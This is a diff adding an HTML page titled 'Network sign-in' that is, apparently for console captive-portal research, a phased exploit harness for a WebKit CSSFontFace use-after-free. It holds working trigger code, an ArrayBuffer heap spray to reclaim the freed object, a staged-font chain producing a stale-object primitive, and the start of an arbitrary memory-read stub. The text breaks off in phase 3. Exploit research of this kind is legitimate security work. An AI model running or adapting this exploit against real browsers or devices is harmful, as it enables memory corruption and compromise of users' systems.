@@ -1,0 +1,955 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Network sign-in</title>
+<style>
+  /* Self-contained: no external assets ever leave this page (the optional
+     phase-2B crafted font comes from the rig's own /stage). Same dark card
+     as the other rig pages. */
+  html, body { margin: 0; padding: 0; background: #101318; color: #e8eaf0;
+               font-family: sans-serif; }
+  #rig-card { max-width: 900px; margin: 24px auto; padding: 20px 24px;
+              background: #1a1f2b; border: 1px solid #2c3446; border-radius: 10px; }
+  #rig-card h1 { font-size: 24px; margin: 0 0 4px 0; }
+  #rig-card h2 { font-size: 14px; font-weight: normal; color: #8f9ab3;
+                 margin: 0 0 16px 0; }
+  #rig-state { display: inline-block; padding: 2px 10px; border-radius: 6px;
+               font-size: 14px; background: #3a4460; }
+  #rig-state.done { background: #2e6b3a; }
+  #rig-state.hit { background: #7a2e35; }
+  #rig-state.failed { background: #7a2e35; }
+  table { width: 100%; border-collapse: collapse; font-size: 17px; }
+  td { padding: 5px 6px; border-bottom: 1px solid #262d3d; vertical-align: top; }
+  td.k { color: #9fb0d8; white-space: nowrap; width: 40%; }
+  td.v { word-break: break-all; font-family: monospace; font-size: 15px; }
+  .note { color: #8f9ab3; font-size: 13px; margin-top: 14px; }
+</style>
+</head>
+<body>
+<div id="rig-card">
+  <h1>Network sign-in</h1>
+  <h2>CSSFontFace::setStatus UAF harness &mdash; BarbarismJB webkit-rig
+      fontchain (CVE-2026-43715 class, phased; SAFE trigger-only by default)</h2>
+  <div id="rig-state">BOOT</div>
+  <table id="rig-rows">
+    <tr><td class="k">user agent</td><td class="v" id="rig-ua">probing&hellip;</td></tr>
+    <tr><td class="k">page url</td><td class="v" id="rig-url">&nbsp;</td></tr>
+    <tr><td class="k">phase gate</td><td class="v" id="rig-gate">asking rig&hellip;</td></tr>
+    <tr><td class="k">phase 1 &mdash; trigger oracle</td><td class="v" id="rig-p1">pending</td></tr>
+    <tr><td class="k">phase 2 &mdash; reclaim spray</td><td class="v" id="rig-p2">pending</td></tr>
+    <tr><td class="k">phase 2B &mdash; staged-font chain</td><td class="v" id="rig-p2b">pending</td></tr>
+    <tr><td class="k">phase 3 &mdash; arb-read stub</td><td class="v" id="rig-p3">pending</td></tr>
+    <tr><td class="k">verdict</td><td class="v" id="rig-verdict">pending</td></tr>
+    <tr><td class="k">telemetry</td><td class="v" id="rig-post">pending</td></tr>
+  </table>
+  <div class="note">Phase 1 is trigger-only and SAFE by default. Phases 2/3
+      run ONLY after the bench operator advances the rig-side gate:
+      <tt>curl -X POST http://RIG/rig/phase -d '{"phase":2}'</tt> (local
+      only). A crash mid-run leaves an "armed" localStorage marker; the next
+      load reports it as the crash half of the oracle. Page marker
+      fontchain (see docs/RIG.md).</div>
+</div>
+<noscript><div style="color:#e8eaf0;padding:20px">
+  JavaScript did not run: the applet blocked scripting or the page did not
+  load. Record this -- it is a negative result for the harness.</div></noscript>
+<script>
+/* BarbarismJB webkit-rig fontchain page: CSSFontFace::setStatus UAF harness.
+ *
+ * PROVENANCE -- BUILT FROM THE PUBLICLY DOCUMENTED BUG CLASS, NOT COPIED
+ * EXPLOIT CODE. Sources (public GitHub, fetched 2026-11-11):
+ *   - Jmesmykil/switch2-captive-portal-research cssfontface/
+ *     WebKit-CSSFontFace-UAF.md -- the bug: CSSFontFace::setStatus
+ *     (wkc3 0x71009AE144) snapshots the client list at +0x58, then invokes
+ *     client vtable slot +0x18 without re-checking registration; reentrant
+ *     style/layout during notification (FontFace.prototype.then getter
+ *     fires during promise assimilation of face.loaded's resolution) can
+ *     remove/reassociate the client, leaving the callback on a stale
+ *     object. Trigger shape, sizeof(CSSFontFace)=0xB8 @0x9ac7d8,
+ *     status-byte write at +0x7A, client iterator re-read from +0x58, and
+ *     the autda-signed client dispatch are all documented there.
+ *   - cssfontface/PORT.md -- upstream lineage (ntfargo/CSSFontFace-Exploit,
+ *     PS4/PS5): FontFaceSet::load holds a raw CSSFontFace reference across
+ *     rule deletion; reclaim with 0xB8 ArrayBuffers; m_featureSettings
+ *     (buffer ptr/size/cap) gives the read primitive.
+ *   - cssfontface/scenario.html + arw-final.html -- the documented reclaim
+ *     signatures (reclaimed ArrayBuffer refcount slot reads 2; stale
+ *     FontFace reports default unicodeRange "U+0-10FFFF"), the
+ *     m_featureSettings byte-read loop via featureSettings.charCodeAt, and
+ *     the self-address chain m_wrapper@+0x60 -> (+8) -> m_backing@+0x30.
+ *   - cssfontface/ANALYSIS-pac-bypass.md -- wkc3 signs data pointers
+ *     (pacda vptr, autda dispatch), so phase 3 STOPS at a read primitive;
+ *     no vtable hijack is attempted here.
+ *
+ * PHASES (config constants in CFG below; all offsets are the publicly
+ * documented wkc3 23.0.1 build values -- re-derive before other builds):
+ *   1 (default, SAFE): trigger-only. For each local-font candidate: install
+ *     @font-face, force layout, find the FontFace, prime .loaded, install a
+ *     FontFace.prototype.then getter that deletes the rule + invalidates
+ *     layout (NO SPRAY), call face.load(). Oracle: getter fired? page
+ *     alive? status transitions? A crash shows as an "armed" localStorage
+ *     marker on the NEXT load (this load posts nothing further).
+ *   2 (rig gate >= 2): pattern A -- same trigger with a 0xB8 ArrayBuffer
+ *     spray inside the getter; scan the spray for the documented reclaim
+ *     signatures (refcount slot reads 2 / unexpected dirty bytes) and dump
+ *     any hit for offset derivation. Pattern 2B (needs a crafted font
+ *     staged at CFG.R2_FONT_URL): the FontFaceSet::load rule-juggling shape
+ *     that yields the stale FontFace + reclaimed ArrayBuffer pair.
+ *   3 (rig gate >= 3): arb-read STUB. Uses the phase-2 primitive (if any)
+ *     to pivot m_featureSettings at an address: self-address chain dump +
+ *     optional explicit address from ?addr=0x...&len=N. Read-only; the PAC
+ *     analysis above is why there is no write/JOP phase.
+ *
+ * The gate: GET /rig/phase returns the rig-side phase; the page also
+ * accepts ?phase=N but the EFFECTIVE phase is the minimum of the two --
+ * advancing requires the explicit local-only rig flag, never a URL.
+ *
+ * Every phase POSTs detailed telemetry (timings, FontFace states,
+ * exception text, dumps). ES5-only like the other rig pages. The server
+ * templates {{RIG_HOST}}/{{RIG_PORT}}; unfilled tokens fall back to
+ * location.host.
+ */
+
+var RIG_SCHEMA = 1;
+var RIG_PAGE = "fontchain";
+var RIG_HOST = "{{RIG_HOST}}";
+var RIG_PORT = "{{RIG_PORT}}";
+var RIG_FILLED = RIG_HOST.indexOf("{{") !== 0;
+var RIG_BASE = RIG_FILLED
+    ? "http://" + RIG_HOST + ":" + RIG_PORT
+    : (location.protocol + "//" + location.host);
+
+/* ------------------------------------------------- config constants */
+var CFG = {
+  /* wkc3 23.0.1 layout (public docs; see PROVENANCE above) */
+  SIZEOF_CSSFONTFACE: 0xb8,        /* mov w0,#0xb8 @0x9ac7d8            */
+  OFF_FEATURESETTINGS: 0x28,      /* m_featureSettings buffer ptr (u32 pair) */
+  OFF_FEATURESETTINGS_SIZE: 0x30, /* m_size                             */
+  OFF_FEATURESETTINGS_CAP: 0x34,  /* m_capacity                         */
+  OFF_WRAPPER: 0x60,              /* CSSFontFace::m_wrapper -> FontFace */
+  OFF_BACKING: 0x30,              /* FontFace::m_backing -> CSSFontFace */
+  OFF_STATUS: 0x7a,               /* status byte (strb @0x9ae238)       */
+  OFF_REFCOUNT: 8,                /* spray marker slot; 2 == reclaimed  */
+  /* reclaim / grooming */
+  SPRAY_COUNT: 0xb0,              /* ArrayBuffers per getter            */
+  SPRAY_MARKER_RC: 1,             /* value written at OFF_REFCOUNT      */
+  SPRAY_MARKER_STATUS: 3,         /* value written at OFF_STATUS (Loading) */
+  GROOM_PREROLL: 16,              /* allocations before the trigger     */
+  /* trigger */
+  LOCAL_FONT_CANDIDATES: ["Helvetica", "systemfont", "Arial", "sans-serif"],
+  FAMILY_PREFIX: "FcTrig",
+  SETTLE_MS: 800,
+  R2_FONT_URL: "/stage/fontchain-r2.otf",   /* 2B needs a crafted font staged */
+  MAX_DUMP_BYTES: 0xb8
+};
+
+var R = {
+  schema: RIG_SCHEMA,
+  page: "fontchain",
+  phase: "boot",
+  seq: 0,
+  startedAt: (new Date()).toISOString(),
+  stage: "boot",
+  rig: { templated: RIG_FILLED ? (RIG_HOST + ":" + RIG_PORT) : null,
+         base: RIG_BASE, pageHost: location.host },
+  location: { url: location.href, referrer: document.referrer || null },
+  env: { userAgent: navigator.userAgent },
+  gate: { rigPhase: null, requestedPhase: null, effectivePhase: null,
+          priorCrash: false },
+  p1: { candidates: [], verdict: null },
+  p2: null,
+  p2b: null,
+  p3: null,
+  verdict: null,
+  cfg: {                                   /* echo the constants we ran with */
+    sizeof: CFG.SIZEOF_CSSFONTFACE,
+    featureSettings: [CFG.OFF_FEATURESETTINGS, CFG.OFF_FEATURESETTINGS_SIZE,
+                      CFG.OFF_FEATURESETTINGS_CAP],
+    wrapper: CFG.OFF_WRAPPER, backing: CFG.OFF_BACKING,
+    status: CFG.OFF_STATUS, sprayCount: CFG.SPRAY_COUNT,
+    localCandidates: CFG.LOCAL_FONT_CANDIDATES.slice()
+  },
+  errors: []
+};
+
+function fail(stage, e) {
+  if (R.errors.length < 20) {
+    R.errors.push({ stage: stage, error: String(e && e.message ? e.message : e) });
+  }
+}
+function $(id) { return document.getElementById(id); }
+function setRow(id, text) { try { $(id).textContent = String(text); } catch (e) {} }
+function setState(text, cls) {
+  try { var el = $("rig-state"); el.textContent = text;
+        el.className = cls || ""; } catch (e) {}
+}
+function nowMs() {
+  try {
+    if (typeof performance !== "undefined" && performance &&
+        typeof performance.now === "function") {
+      return performance.now();
+    }
+  } catch (e) {}
+  return Date.now();
+}
+function r2(x) { return Math.round(x * 100) / 100; }
+function probe(stage, fn) {
+  try { return fn(); } catch (e) { fail(stage, e); return null; }
+}
+function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
+function hexdump(u8, max) {
+  var lines = [], n = Math.min(u8.length, max || CFG.MAX_DUMP_BYTES), i, row;
+  for (i = 0; i + 8 <= n; i += 8) {
+    row = "+" + ("000" + i.toString(16)).slice(-3) + "  ";
+    row += hex8((u8[i] | u8[i + 1] << 8 | u8[i + 2] << 16 | u8[i + 3] << 24) >>> 0) + " ";
+    row += hex8((u8[i + 4] | u8[i + 5] << 8 | u8[i + 6] << 16 | u8[i + 7] << 24) >>> 0);
+    lines.push(row);
+  }
+  if (i < n) {
+    row = "+" + ("000" + i.toString(16)).slice(-3) + " ";
+    for (; i < n; i++) { row += ("0" + u8[i].toString(16)).slice(-2); }
+    lines.push(row);
+  }
+  return lines;
+}
+
+/* ------------------------------------------------------- transport */
+function sendJson(url, obj, cb) {
+  var payload;
+  try { payload = JSON.stringify(obj); }
+  catch (e) { fail("post.stringify", e); cb(false); return; }
+  if (typeof fetch === "function") {
+    fetch(url, { method: "POST",
+                 headers: { "Content-Type": "application/json" },
+                 body: payload })
+      .then(function (res) { cb(!!res && res.ok); })
+      .catch(function () { viaXhr(url, payload, cb); });
+    return;
+  }
+  viaXhr(url, payload, cb);
+}
+function viaXhr(url, payload, cb) {
+  if (typeof XMLHttpRequest === "undefined") { cb(false); return; }
+  var done = false;
+  function finish(ok) { if (!done) { done = true; cb(ok); } }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.timeout = 5000;
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) { finish(xhr.status >= 200 && xhr.status < 300); }
+    };
+    xhr.onerror = function () { finish(false); };
+    xhr.ontimeout = function () { finish(false); };
+    xhr.send(payload);
+  } catch (e) { fail("post.xhr", e); finish(false); }
+}
+var BACKOFF_MS = [250, 500, 1000, 2000, 4000, 8000];
+function postReport(phase, cb) {
+  var attempts = 0;
+  function attempt() {
+    attempts++;
+    R.phase = phase;
+    R.seq++;
+    sendJson(RIG_BASE + "/report", R, function (ok) {
+      if (ok) { cb(true, attempts); return; }
+      if (attempts <= BACKOFF_MS.length) {
+        setRow("rig-post", "retry " + attempts + " in " + BACKOFF_MS[attempts - 1] + "ms");
+        setTimeout(attempt, BACKOFF_MS[attempts - 1]);
+      } else { cb(false, attempts); }
+    });
+  }
+  attempt();
+}
+function getJson(url, cb, timeoutMs) {
+  var settled = false;
+  var to = setTimeout(function () {
+    if (!settled) { settled = true; cb(null, "timeout"); }
+  }, timeoutMs || 4000);
+  if (typeof fetch === "function") {
+    fetch(url)
+      .then(function (res) {
+        return res.json();
+      })
+      .then(function (j) {
+        if (!settled) { settled = true; clearTimeout(to); cb(j, null); }
+      })
+      .catch(function (e) {
+        if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); }
+      });
+    return;
+  }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.timeout = timeoutMs || 4000;
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && !settled) {
+        settled = true; clearTimeout(to);
+        if (xhr.status >= 200 && xhr.status < 300) {
+          try { cb(JSON.parse(xhr.responseText), null); }
+          catch (e) { cb(null, "bad json"); }
+        } else { cb(null, "HTTP " + xhr.status); }
+      }
+    };
+    xhr.onerror = function () {
+      if (!settled) { settled = true; clearTimeout(to); cb(null, "xhr.error"); }
+    };
+    xhr.send();
+  } catch (e) { if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); } }
+}
+
+/* ------------------------------------------------- crash-oracle marker */
+var MARKER_KEY = "fontchain:last-run";
+function armMarker(tag) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "armed", tag: tag,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function disarmMarker(tag, verdict) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "done", tag: tag,
+                                                     verdict: verdict,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function checkPriorCrash() {
+  try {
+    var raw = localStorage.getItem(MARKER_KEY);
+    if (!raw) { return null; }
+    var m = JSON.parse(raw);
+    return m && m.state === "armed" ? m : null;
+  } catch (e) { return null; }
+}
+
+/* ------------------------------------------------------ phase 1 trigger */
+/* The documented trigger, NO spray: install rule -> layout -> find face ->
+ * prime .loaded -> then-getter (rule delete + layout flush inside) ->
+ * face.load(). Reports fired/survived/status per candidate. */
+function findFaceByFamily(family) {
+  var target = family.replace(/['"]/g, ""), it = document.fonts, f = null;
+  try {
+    it.forEach(function (x) {
+      if (f) { return; }
+      var fam = String(x.family || "").replace(/['"]/g, "");
+      if (fam === target) { f = x; }
+    });
+  } catch (e) {
+    /* forEach-less FontFaceSet: length/index iteration */
+    try {
+      for (var i = 0; i < it.length; i++) {
+        var fam2 = String(it[i].family || "").replace(/['"]/g, "");
+        if (fam2 === target) { f = it[i]; break; }
+      }
+    } catch (e2) { fail("p1.findFace", e2); }
+  }
+  return f;
+}
+function restoreThen(desc) {
+  try {
+    if (desc) { Object.defineProperty(FontFace.prototype, "then", desc); }
+    else { delete FontFace.prototype.then; }
+  } catch (e) { fail("p1.restoreThen", e); }
+}
+function runTriggerCandidate(candidate, index, spray, cb) {
+  var res = { candidate: candidate, spray: !!spray };
+  var family = CFG.FAMILY_PREFIX + index;
+  var style = document.createElement("style");
+  var face = null, fired = false, sprayBufs = null;
+  var tInstall = 0, tGetter = 0, tLoadCall = 0;
+  var thenDesc = null;
+
+  probe("p1.setup", function () {
+    style.textContent = "@font-face{font-family:" + family +
+                        ";src:local(" + candidate + ");}";
+    document.head.appendChild(style);
+    tInstall = nowMs();
+    void document.body.offsetHeight;          /* force layout */
+    res.layoutMs = r2(nowMs() - tInstall);
+    face = findFaceByFamily(family);
+  });
+  if (!face) {
+    res.verdict = "FACE-MISSING";              /* rule never produced a FontFace */
+    probe("p1.cleanup-face-missing", function () { style.remove(); });
+    cb(res, null);
+    return;
+  }
+  res.statusBefore = face.status;
+
+  armMarker((spray ? "p2:" : "p1:") + candidate);
+  probe("p1.prime", function () { void face.loaded; });
+  thenDesc = probe("p1.saveThen", function () {
+    return Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
+  });
+
+  var getterError = null;
+  probe("p1.getter", function () {
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true,
+      get: function () {
+        if (this !== face) { return undefined; }
+        try {
+          fired = true;
+          tGetter = nowMs();
+          style.remove();                       /* rule deletion -> client churn */
+          void document.body.offsetHeight;      /* reentrant style/layout */
+          if (spray) {
+            sprayBufs = [];
+            var t0 = nowMs();
+            for (var i = 0; i < CFG.GROOM_PREROLL; i++) {
+              sprayBufs.push(new ArrayBuffer(CFG.SIZEOF_CSSFONTFACE));
+            }
+            for (var j = 0; j < CFG.SPRAY_COUNT; j++) {
+              var b = new ArrayBuffer(CFG.SIZEOF_CSSFONTFACE);
+              var dv = new DataView(b);
+              dv.setUint32(CFG.OFF_REFCOUNT, CFG.SPRAY_MARKER_RC, true);
+              dv.setUint8(CFG.OFF_STATUS, CFG.SPRAY_MARKER_STATUS);
+              sprayBufs.push(b);
+            }
+            res.sprayMs = r2(nowMs() - t0);
+            res.sprayCount = sprayBufs.length;
+          }
+        } catch (e) { getterError = String(e && e.message ? e.message : e); }
+        return undefined;
+      }
+    });
+  });
+
+  var loadThrew = null;
+  probe("p1.load", function () {
+    tLoadCall = nowMs();
+    try {
+      var p = face.load();
+      res.syncFired = fired;                    /* sync part of the oracle */
+      if (p && typeof p.then === "function") {
+        p.then(function (f) {
+          res.loadSettled = "fulfilled";
+          res.statusFromPromise = f && f.status;
+        }, function (e) {
+          res.loadSettled = "rejected";
+          res.loadError = String(e && e.message ? e.message : e).slice(0, 160);
+        });
+      }
+    } catch (e) { loadThrew = String(e && e.message ? e.message : e); }
+  });
+  res.loadThrew = loadThrew;
+  res.fired = fired;
+  if (getterError) { res.getterError = getterError; }
+
+  /* settle: promise assimilation + any deferred status work lands here */
+  setTimeout(function () {
+    probe("p1.settle", function () {
+      res.firedAfterSettle = fired;
+      res.fired = fired;                       /* final value, post-settle */
+      try { res.statusAfter = face.status; } catch (e) {
+        res.statusAfter = "threw:" + String(e && e.message ? e.message : e);
+      }
+      var t2 = nowMs();
+      res.totalMs = r2(t2 - tLoadCall);
+      /* aliveness: if the UAF corrupted state we usually die before this
+       * callback; being here at all is the survived half of the oracle */
+      res.fontsIterable = false;
+      try {
+        var count = 0;
+        document.fonts.forEach(function () { count++; });
+        res.fontsIterable = true;
+        res.fontsSize = count;
+      } catch (e2) {
+        try { res.fontsSize = document.fonts.length; res.fontsIterable = true; }
+        catch (e3) { res.fontsIterable = false; }
+      }
+    });
+    restoreThen(thenDesc);
+    if (!fired) {
+      res.verdict = res.loadSettled === "rejected" ? "LOCAL-FONT-UNRESOLVED"
+          : (res.statusAfter === "error" ? "LOCAL-FONT-ERROR" : "GETTER-NEVER-FIRED");
+    } else {
+      res.verdict = (res.fontsIterable && res.statusAfter !== undefined)
+          ? (spray ? "FIRED-SURVIVED-SPRAYED" : "FIRED-SURVIVED")
+          : "FIRED-STATE-BROKEN";
+    }
+    cb(res, sprayBufs);
+  }, CFG.SETTLE_MS);
+}
+
+function phase1(cb) {
+  var results = [];
+  var idx = 0;
+  var firedCandidate = null;
+  function next() {
+    if (idx >= CFG.LOCAL_FONT_CANDIDATES.length) {
+      R.p1.candidates = results;
+      var fired = 0, survived = 0, i;
+      for (i = 0; i < results.length; i++) {
+        if (results[i].verdict === "FIRED-SURVIVED") { fired++; survived++; }
+        if (results[i].verdict === "FIRED-SURVIVED-SPRAYED") { fired++; survived++; }
+      }
+      R.p1.verdict = fired > 0 ? "TRIGGER-LIVE-SURVIVED"
+          : (results.length && results[0].verdict === "FACE-MISSING"
+             ? "NO-FONTFACE-API" : "GETTER-NEVER-FIRED");
+      setRow("rig-p1", R.p1.verdict + " (" + fired + "/" +
+             results.length + " candidates fired)");
+      disarmMarker("p1", R.p1.verdict);
+      cb(firedCandidate);
+      return;
+    }
+    var cand = CFG.LOCAL_FONT_CANDIDATES[idx];
+    runTriggerCandidate(cand, idx, false, function (res) {
+      results.push(res);
+      setRow("rig-p1", res.candidate + ": " + res.verdict);
+      if (firedCandidate === null &&
+          (res.verdict === "FIRED-SURVIVED" ||
+           res.verdict === "FIRED-STATE-BROKEN")) {
+        firedCandidate = cand;
+      }
+      idx++;
+      next();
+    });
+  }
+  next();
+}
+
+/* -------------------------------------------------- phase 2: reclaim */
+function scanSpray(bufs) {
+  var hits = [], scanned = 0, i, u8, dv, dirty, k, rc;
+  for (i = 0; i < bufs.length; i++) {
+    u8 = new Uint8Array(bufs[i]);
+    dv = new DataView(bufs[i]);
+    rc = dv.getUint32(CFG.OFF_REFCOUNT, true);
+    dirty = false;
+    for (k = 0; k < u8.length; k++) {
+      var isMarker = (k >= 8 && k <= 11) || k === CFG.OFF_STATUS;
+      if (!isMarker && u8[k] !== 0) { dirty = true; break; }
+    }
+    scanned++;
+    if (rc === 2 || dirty) {
+      hits.push({ index: i, refcount: rc, dirty: dirty,
+                  dump: hexdump(u8, CFG.MAX_DUMP_BYTES) });
+      if (hits.length >= 3) { break; }        /* 3 dumps is plenty of signal */
+    }
+  }
+  return { scanned: scanned, hits: hits,
+           reclaimed: hits.length > 0 };
+}
+function phase2(cb) {
+  var cand = R.p1.candidates.length
+      ? (function () {
+          var i;
+          for (i = 0; i < R.p1.candidates.length; i++) {
+            if (R.p1.candidates[i].verdict === "FIRED-SURVIVED" ||
+                R.p1.candidates[i].verdict === "FIRED-STATE-BROKEN") {
+              return R.p1.candidates[i].candidate;
+            }
+          }
+          return CFG.LOCAL_FONT_CANDIDATES[0];
+        })()
+      : CFG.LOCAL_FONT_CANDIDATES[0];
+  runTriggerCandidate(cand, 100, true, function (res, bufs) {
+    R.p2 = res;
+    if (bufs) {
+      probe("p2.scan", function () {
+        var scan = scanSpray(bufs);
+        R.p2.scan = scan;
+        if (scan.reclaimed) {
+          R.p2.verdict = "RECLAIM-HIT";
+          var i;
+          for (i = 0; i < scan.hits.length; i++) {
+            if (scan.hits[i].refcount === 2) {
+              R.p2.reclaimedBufferIndex = scan.hits[i].index;
+              break;
+            }
+          }
+        } else {
+          R.p2.verdict = "NO-RECLAIM";
+        }
+      });
+    } else {
+      R.p2.verdict = res.verdict;             /* trigger itself failed */
+    }
+    setRow("rig-p2", R.p2.verdict +
+           (R.p2.scan ? " (" + R.p2.scan.scanned + " scanned, " +
+            R.p2.scan.hits.length + " hit)" : ""));
+    disarmMarker("p2", R.p2.verdict);
+    cb();
+  });
+}
+
+/* --------------------------- phase 2B: FontFaceSet::load staged-font shape */
+/* The scenario.html shape: rule padding around a url() rule, a separately
+ * added local() face, document.fonts.load("1em a,b","AB"), getter deletes
+ * the url rule + padding and sprays. Yields the STALE FontFace (default
+ * unicodeRange) + the RECLAIMED ArrayBuffer (refcount 2). Needs the
+ * crafted font staged at CFG.R2_FONT_URL (fetch-check first). */
+function phase2b(cb) {
+  var out = { attempted: false };
+  if (typeof fetch !== "function") {
+    out.verdict = "SKIPPED";
+    out.reason = "no fetch";
+    R.p2b = out;
+    setRow("rig-p2b", "skipped: no fetch");
+    setTimeout(cb, 0);
+    return;
+  }
+  out.attempted = true;
+  fetch(RIG_BASE + CFG.R2_FONT_URL)
+    .then(function (res) {
+      if (!res.ok) { throw new Error("staged font missing (HTTP " + res.status + ")"); }
+      return res.arrayBuffer();
+    })
+    .then(function (buf) {
+      out.fontBytes = buf.byteLength;
+      runStagedChain(buf, function (staged) {
+        for (var k in staged) { out[k] = staged[k]; }
+        R.p2b = out;
+        setRow("rig-p2b", out.verdict || "?");
+        cb();
+      });
+    })
+    .catch(function (e) {
+      out.verdict = "SKIPPED";
+      out.reason = String(e && e.message ? e.message : e);
+      R.p2b = out;
+      setRow("rig-p2b", "skipped: " + out.reason.slice(0, 80));
+      cb();
+    });
+}
+function runStagedChain(fontBuf, cb) {
+  var n = CFG.SPRAY_COUNT, ab = [], ft = null, fa = null;
+  var fam = "fontchain-b";
+  var style = document.createElement("style");
+  var r1 = "@font-face{font-family:s;src:local(" +
+           (CFG.LOCAL_FONT_CANDIDATES[1] || "systemfont") +
+           ");unicode-range:U+0043}";
+  var r2rule = "@font-face{font-family:" + fam +
+               ";src:url(" + RIG_BASE + CFG.R2_FONT_URL + ");unicode-range:U+0042}";
+  var A = null, fs = null, thenDesc = null;
+  var staged = { attempted: true };
+
+  probe("p2b.run", function () {
+    A = new FontFace("a", "local(" + (CFG.LOCAL_FONT_CANDIDATES[1] || "systemfont") + ")",
+                     { unicodeRange: "U+0041" });
+    document.fonts.add(A);
+    void A.loaded;
+    document.head.appendChild(style);
+    var i;
+    for (i = 0; i < Math.floor(n / 4); i++) {
+      style.sheet.insertRule(r1, style.sheet.cssRules.length);
+    }
+    var u = style.sheet.cssRules.length;
+    style.sheet.insertRule(r2rule, style.sheet.cssRules.length);
+    for (i = Math.floor(n / 4); i < n; i++) {
+      style.sheet.insertRule(r1, style.sheet.cssRules.length);
+    }
+    void document.body.offsetHeight;
+    staged.rulesInstalled = n + 1;
+    staged.uIndex = u;
+    thenDesc = Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true,
+      get: function () {
+        if (this !== A) { return undefined; }
+        try {
+          fired = true;
+          style.sheet.deleteRule(u);
+          void document.body.offsetHeight;
+          for (var i2 = style.sheet.cssRules.length - 1; i2 >= 0; i2--) {
+            var txt = style.sheet.cssRules[i2].cssText;
+            if (txt.indexOf("s;") >= 0 || txt.indexOf("spray") >= 0) {
+              style.sheet.deleteRule(i2);
+            }
+          }
+          void document.body.offsetHeight;
+          var t0 = nowMs();
+          for (var j = 0; j < n; j++) {
+            var b = new ArrayBuffer(CFG.SIZEOF_CSSFONTFACE);
+            var dv = new DataView(b);
+            dv.setUint32(8, CFG.SPRAY_MARKER_RC, true);
+            dv.setUint8(CFG.OFF_STATUS, CFG.SPRAY_MARKER_STATUS);
+            ab.push(b);
+          }
+          staged.sprayMs = r2(nowMs() - t0);
+        } catch (e) {
+          staged.getterError = String(e && e.message ? e.message : e);
+        }
+        return undefined;
+      }
+    });
+    staged.getterFired = function () { return fired; };
+  });
+
+  var done = false;
+  var finish = function () {
+    if (done) { return; }
+    done = true;
+    restoreThen(thenDesc);
+    try { if (A) { document.fonts.delete(A); } } catch (e) {}
+    try { style.remove(); } catch (e) {}
+    cb(staged);
+  };
+  /* the load promise only RECORDS its outcome; the settle timeout does the
+   * signature scan and finishes -- finishing from the promise would run
+   * before the spray-hits have observable side effects */
+  probe("p2b.load", function () {
+    document.fonts.load("1em a," + fam, "AB").then(function (loaded) {
+      fs = loaded;
+      staged.loadedCount = loaded ? loaded.length : 0;
+    }, function (e) {
+      staged.loadError = String(e && e.message ? e.message : e).slice(0, 160);
+    });
+  });
+  setTimeout(function () {
+    /* settle + signature scan */
+    probe("p2b.scan", function () {
+      staged.fired = staged.getterFired ? staged.getterFired() : false;
+      if (!fs || fs.length !== 2) {
+        staged.verdict = staged.loadError ? "LOAD-REJECTED" : "NO-TWO-FACES";
+        return;
+      }
+      var i;
+      for (i = 0; i < fs.length; i++) {
+        try {
+          if (fs[i].unicodeRange === "U+0-10FFFF") { ft = fs[i]; }
+        } catch (e) {}
+      }
+      for (i = 0; i < ab.length; i++) {
+        try {
+          if (new DataView(ab[i]).getUint32(CFG.OFF_REFCOUNT, true) === 2) { fa = ab[i]; }
+        } catch (e) {}
+      }
+      staged.staleFace = !!ft;
+      staged.reclaimedBuffer = !!fa;
+      if (ft && fa) {
+        staged.verdict = "PRIMITIVE";
+        staged.dump = hexdump(new Uint8Array(fa), CFG.MAX_DUMP_BYTES);
+        window.__fontchain = window.__fontchain || {};
+        window.__fontchain.ft = ft;
+        window.__fontchain.fa = fa;
+      } else {
+        staged.verdict = ft ? "STALE-FACE-ONLY" : (fa ? "RECLAIM-ONLY" : "NO-SIGNATURE");
+      }
+    });
+    finish();
+  }, CFG.SETTLE_MS + 400);
+  setTimeout(finish, 5000);                  /* backstop: never wedge */
+}
+
+/* -------------------------------------------- phase 3: arb-read stub */
+/* Read-only, per the PAC analysis. Uses the 2B primitive (stale face ft +
+ * reclaimed buffer fa): point m_featureSettings at an address, read bytes
+ * out of featureSettings.charCodeAt(1..4) (documented mechanics). Reports
+ * the self-address chain (m_wrapper@+0x60 -> +8 -> m_backing@+0x30) and
+ * an optional ?addr=0xHEX&len=N dump. */
+function makeReader(ft, fa) {
+  var d = new DataView(fa);
+  var F = CFG.OFF_FEATURESETTINGS, FZ = CFG.OFF_FEATURESETTINGS_SIZE,
+      FC = CFG.OFF_FEATURESETTINGS_CAP;
+  function sp(o, lo, hi) {
+    d.setUint32(o, lo >>> 0, true);
+    d.setUint32(o + 4, hi >>> 0, true);
+  }
+  function rd(lo, hi, sz) {
+    var out = new Uint8Array(sz), i = 0, j, s;
+    while (i < sz) {
+      sp(F, (lo + i) >>> 0, hi);
+      d.setInt32(FZ, 1, true);
+      d.setInt32(FC, 1, true);
+      s = ft.featureSettings;
+      if (typeof s !== "string" || s.length < 5) {
+        throw new Error("featureSettings read failed at +" + i +
+                        " (len=" + (s && s.length) + ")");
+      }
+      for (j = 1; j < 5 && i < sz; j++) { out[i++] = s.charCodeAt(j) & 255; }
+    }
+    return out;
+  }
+  function rdU32(lo, hi) {
+    var b = rd(lo, hi, 4);
+    return (b[0] | b[1] << 8 | b[2] << 16 | b[3] << 24) >>> 0;
+  }
+  return { rd: rd, rdU32: rdU32, view: d };
+}
+function phase3(cb) {
+  var out = { attempted: false };
+  R.p3 = out;
+  var prim = window.__fontchain;
+  if (!prim || !prim.ft || !prim.fa) {
+    out.verdict = "NO-PRIMITIVE";
